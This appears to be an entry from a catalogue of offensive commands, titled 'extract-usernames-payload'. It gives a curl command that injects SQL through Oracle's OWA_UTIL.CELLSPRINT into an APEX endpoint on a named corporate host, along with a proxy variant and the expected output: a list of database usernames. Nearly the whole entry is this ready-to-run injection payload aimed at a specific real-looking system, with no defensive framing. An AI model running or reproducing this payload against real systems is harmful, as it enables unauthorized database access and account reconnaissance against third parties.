---
data: >-
  curl
  "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS"
  -d ":1=SELECT USERNAME FROM ALL_USERS" -v
tags:
  - sqli
  - enumeration
  - oracle
type: command
output: List of usernames from the ALL_USERS view
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.665Z'
id: 2dcd9b37-dcba-44d0-9b83-0387914ebb4d
verified: false
validated: true
submitted: true
---
# extract-usernames-payload

## Command

```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS" -d ":1=SELECT USERNAME FROM ALL_USERS" -v
```

## Description

Exploits SQLi to query and print database usernames from ALL_USERS using OWA_UTIL.CELLSPRINT.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Payload-injected endpoint | Yes |
| -d | Query for :1 | Yes |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=..." -d ":1=..." -v
```

### Advanced Usage

```bash
curl -x http://proxy:8080 "http://ipm.informatica.com/pls/apex/f?..." -d ":1=..." -v
```

## Expected Output

Printed list of usernames in response.

## Related

- [[commands/extract-db-version-payload]]
- [[procedures/Extract-Usernames-via-SQL-Injection]]
